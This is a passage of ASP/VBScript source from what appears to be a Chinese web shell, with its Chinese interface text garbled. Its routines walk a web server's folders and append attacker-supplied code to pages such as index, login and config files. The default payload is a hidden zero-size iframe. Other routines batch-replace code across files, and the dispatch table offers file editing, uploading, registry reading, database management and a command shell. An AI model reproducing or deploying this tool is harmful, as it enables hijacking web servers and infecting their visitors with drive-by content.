Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
Sun = Sun + 1
Exit Sub
End If
End If
Next
End Sub

Case "plgm"
Server.ScriptTimeout=1000000
Response.Buffer=False
RRS ("<b>��ǰ��վ����·��:")&Server.MapPath("/")&("</b>")
ASP_SELF=Request.ServerVariables("PATH_INFO")
s=Request("fd")
if s="" then s=Server.MapPath("/")
ex=Request("ex")
pth=Request("pth")
newcnt=Request("newcnt")
addcode = Request("code")
if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
If ex<>"" AND pth<>"" Then
select Case ex
Case "edit"
CALL file_show(pth)
Case "save"
CALL file_save(pth)
End select
Else
RRS("<form method=""POST""> ")
RRS("<table width=560 border=""0"" style=""font-size:12px;"">")
RRS("<tr>")
RRS("<td width=""102"">Ҫ�����ļ��еľ���·����</td>")
RRS("<td width=""359""><input type=""text"" name=""fd"" value="""&s&""" size=60></td>")
RRS("<td width=""69"">&nbsp;</td>")
RRS("</tr><tr><td>Ҫ����Ĵ���:</td>")
RRS("<td><textarea name=""code"" cols=58 rows=""3"">"&addcode&"</textarea></td>")
RRS("<td><input name=""submit"" type=""submit"" value=""��ʼ""></td>")
RRS("</tr></table></form> ")
End If
Function IsPattern(patt,str)
Set regEx=New RegExp
regEx.Pattern=patt
regEx.IgnoreCase=True
retVal=regEx.Test(str)
Set regEx=Nothing
If retVal=True Then
IsPattern=True
Else
IsPattern=False
End If
End Function
if request.form("submit")<>"" then
If s="" or addcode="" Then
RRS "<font color=red>����������·�������!</font>"
response.end
else If IsPattern("[^ab]{1}:{1}(\\|\/)",s) Then sch s
End If
end if
Sub sch(s)
oN eRrOr rEsUmE nExT
Set fs=Server.createObject("Scripting.FileSystemObject")
Set fd=fs.GetFolder(s)
Set fi=fd.Files
Set sf=fd.SubFolders
For Each f in fi
rtn=f.path
step_all rtn
Next
If sf.Count<>0 Then
For Each l In sf
sch l
Next
End If
End Sub
Sub step_all(agr)
retVal=IsPattern("(\\|\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|login|diy|no|ok|del|config|sql|user|ubb|ftp|asp|top|new|open|name|email|img|images|web|blog|save|data|add|edit|game|about|manager|book|bt|config|mp3|vod|error|copy|move|down|system|logo|QQ|520|newup|myup|play|show|view|ip|err404|send|foot|char|info|list|shop|err|nc|ad|flash|text|admin_upfile|admin_upload|upfile_load|upfile_soft|upfile_photo|upfile_softpic|vip|505)\.(htm|html|asp|php|jsp|aspx|cgi|js)\b",agr)
If retVal Then
step1 agr
step2 agr
Else
Exit Sub
End If
End Sub
Sub step1(str1)
RRS "<div style='line-height:20px'>�� "&str1&" _"
RRs "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DownFile"")' class='am' title='����'>����</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""EditFile"")' class='am' title='�༭'>�༭</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='ɾ��'>ɾ��</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""CopyFile"")' class='am' title='����'>����</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>�ƶ�</a></div>"
End Sub
Sub step2(str2)
Set fs=Server.createObject("Scripting.FileSystemObject")
isExist=fs.FileExists(str2)
If isExist Then
Set f=fs.GetFile(str2)
Set f_addcode=f.OpenAsTextStream(8,-2)
if left(right(str2,8),4)="conn" then
f_addcode.Write
else
f_addcode.Write addcode
f_addcode.Close
Set f=Nothing
End If
end if
Set fs=Nothing
End Sub
Err.Clear
Case "Cplgm"
Fpath=Request("fd")
addcode = Request("code")
addcode2 = Request("code2")
pcfile=request("pcfile")
checkbox=request("checkbox")
ShowMsg=request("ShowMsg")
FType=request("FType")
M=request("M")
if Ftype="" then Ftype="txt|htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx"
if Fpath="\" then Fpath=Server.MapPath("\")
if Fpath="." or Fpath="" then Fpath=Server.MapPath("/")
if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
if checkbox="" then checkbox=request("checkbox")
if pcfile="" then
pcfileName=Request.ServerVariables("SCRIPT_NAME")
pcfilek=split(pcfileName,"/")
pcfilen=ubound(pcfilek)
pcfile=pcfilek(pcfilen)
end if
RRS ("<b>��վ��Ŀ¼</b>- "&Server.MapPath("/")&"<br>")
RRS ("<b>������Ŀ¼</b>- "&Server.MapPath("."))
RRS "<form method=POST><div style='color:#3399ff'><b>["
if M="1" then RRS"����������-��������"
if M="2" then RRS"����������-������˵�����"
if M="3" then RRS"�����滻��-�ļ��滻�޸Ĺ���"
if M="" then response.end
RRS "]</b></div><table width=100% border=0><tr><td>�ļ�·����</td>"
RRS "<td><input type=text name=fd value=""\"" size=40> �\������վ��Ŀ¼����.��Ϊ��������Ŀ¼</td></tr>"
if M="1" then RRS "<tr><td>�����ظ���</td><td><input class=c name='checkbox' checked='checked' type=checkbox value=""checked"" "&checkbox&"> ��ֹһ��ҳ�����ж���ظ��Ĵ���</td></tr>"

RRS "<tr><td>�ų��ļ���</td>"
RRS "<td><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=40> ���벻�뱻�޸ĵ��ļ��������磺1.asp|2.asp|3.asp</td></tr>"
RRS "<tr><td>�ļ����ͣ�</td>"
RRS "<td><input name='FType' type=text id='FType' value='"&Ftype&"' size=40> ����Ҫ�޸ĵ��ļ�����[��չ��]�����磺htm|html|asp|php|jsp|aspx|cgi</td></tr><tr><td><font color=#3399ff>"
if M="1" then RRS"Ҫ�ҵ���"
if M="2" then RRS"Ҫ�����"
if M="3" then RRS"�������ݣ�"
RRS"</font></td><td><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
if M="3" then RRS "<tr><td><font color=#3399ff>�� �� Ϊ��</font></td><td><textarea name=code2 cols=66 rows=3>"&addcode&"</textarea></td></tr>"
RRS "<tr><td></td><td> <input name=submit type=submit value=��ʼִ��> --��ǽ���--[�ɹ����� �� �ų����� �� �ظ���<font color=red>��</font>]</td></tr>"
RRS "</table></form>"
if request("submit")="��ʼִ��" then
RRS"<div style='line-height:25px'><b>ִ�м�¼��</b><br>"
call InsertAllFiles(Fpath,addcode,pcfile)
RRS"</div>"
end if
Sub InsertAllFiles(Wpath,Wcode,pc)
Server.ScriptTimeout=999999999
if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
Set WFSO = CreateObject("Scripting.FileSystemObject")
on error resume next
Set f = WFSO.GetFolder(Wpath)
Set fc2 = f.files
For Each myfile in fc2
Set FS1 = CreateObject("Scripting.FileSystemObject")
FType1=split(myfile.name,".")
FType2=ubound(FType1)
if Ftype2>0 then
FType3=LCase(FType1(FType2))
else
FType3="��"
end if
if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
select case M
case "1"
if checkbox<>"checked" then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
if left(myfile.name,4)="conn" then
tfile.Write
RRS"��  "&Wpath&myfile.name
	else
tfile.writeline Wcode
RRS"�� "&Wpath&myfile.name
tfile.close
end if
end if
if checkbox="checked" then
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
if Instr(tfile1.readall,Wcode)=0 then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
if left(myfile.name,4)="conn" then
tfile.Write
RRS"�� "&Wpath&myfile.name
 else
tfile.writeline Wcode
RRS"��  "&Wpath&myfile.name
tfile1.close
end if
	else
RRS"<font color=red>��</font> "&Wpath&myfile.name
tfile1.close
end if
Set tfile1=Nothing
end if
case "2"
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
NewCode=Replace(tfile1.readall,Wcode,"")
Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
objCountFile.Write NewCode
objCountFile.Close
RRS"��  "&Wpath&myfile.name
Set objCountFile=Nothing
case "3"
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
NewCode=Replace(tfile1.readall,Wcode,addCode2)
Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
objCountFile.Write NewCode
objCountFile.Close
RRS"��  "&Wpath&myfile.name
Set objCountFile=Nothing
case else
RRS"���,������.":response.end
end select
else
RRS"�� "&Wpath&myfile.name
end if
RRS " �� <a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""DownFile"")' class='am' title='����'>����</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""EditFile"")' class='am' title='�༭'>�༭</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>ɾ��</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""CopyFile"")' class='am' title='����'>����</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>�ƶ�</a><br>"
Next
Set fsubfolers = f.SubFolders
For Each f1 in fsubfolers
NewPath=Wpath&""&f1.name
InsertAllFiles NewPath,Wcode,pc
Next
set tfile=nothing
Set FSO = Nothing
set tfile=nothing
set tfile2=nothing
Set WFSO = Nothing
End Sub
Case "ReadREG":call ReadREG()
Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
Case "DownFile":DownFile FName:ShowErr()
Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
Case "UpFile":UpFile()
Case "Cmd1Shell":Cmd1Shell()
Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL
Case "DbManager":DbManager()
Case "Course":Course()
Case "ServerInfo":ServerInfo()
Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
RRS"</body></html>"
%>